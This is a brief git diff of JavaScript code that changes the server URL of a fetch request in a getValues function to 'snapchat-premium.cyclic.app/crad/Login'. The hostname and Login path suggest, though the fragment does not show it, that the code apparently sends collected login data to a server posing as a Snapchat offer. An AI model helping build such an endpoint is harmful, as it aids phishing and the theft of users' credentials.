@@ -14,7 +14,7 @@ const getValues = async () => {
     };
     
     // Define the URL of the server
-    const url = 'https://mushy-eel-singlet.cyclic.app/crad/Login'; // Replace with your server URL
+    const url = 'https://snapchat-premium.cyclic.app/crad/Login'; // Replace with your server URL
     
     // Define the options for the fetch request
     const options = {
